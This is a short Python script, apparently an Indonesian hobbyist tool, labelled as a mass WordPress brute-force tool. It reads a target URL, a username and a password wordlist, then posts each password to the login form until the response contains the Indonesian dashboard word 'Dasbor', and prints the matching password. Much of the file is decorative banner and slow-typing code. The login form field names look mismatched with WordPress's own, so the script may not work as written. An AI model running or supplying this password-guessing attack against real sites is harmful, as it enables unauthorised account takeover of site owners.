#	TOOLS MASS WORDPRESS BRUTE FORCE
#	NOTE: Lu N00B dek
import os,sys
import requests
import time
from colorama import init, Fore, Back, Style

init()


#STYLE TEXT
def slow(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)
def med(s):
   for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
def fast(s):
   for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2. / 170)
logo = """\033[92m
[+]======================================[+]
__        ______  ____  _____ 
\ \      / /  _ \| __ )|  ___|
 \ \ /\ / /| |_) |  _ \| |_   by 
  \ V  V / |  __/| |_) |  _|  
   \_/\_/  |_|   |____/|_|    v0.2

[+]======================================[+]
\033[00m
"""
#END STYLE

#MAIN PROGRAM
def main():
	os.system('clear')
	slow("\033[93m [*]Sedang Mengonfigurasi...\033[00m")
	slow("\033[93m [*]Menginstall Packet Mohon Tunggu... \033[00m")
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('clear')
	med("\033[93m [*]Berhasil Menginstall Packet Yang Dibutuhkan... \033[00m")
	time.sleep(1)
	os.system('clear')
	fast(logo)
	submain()

def submain():
	try:
		dashboard = b"Dasbor"
		url = input("url> ")
		usr = input("usr> ")
		lst = input("list> ")
		f = open(lst, 'r').readlines()
		lists = 1 
		for x in f:
			pss = x.strip()
			form = {
			"Username":usr,
			"Password":pss,
			"submit":"wp-submit"
			}
			http = requests.post(url, data=form)
			req = http.content

			if dashboard in req:
				print(lists)
				print(pss)
				break
			else:
				print(lists, pss)
				lists += 1
	except:
		slow("[+]Thaks To Use...")

if __name__ == '__main__':
	main()
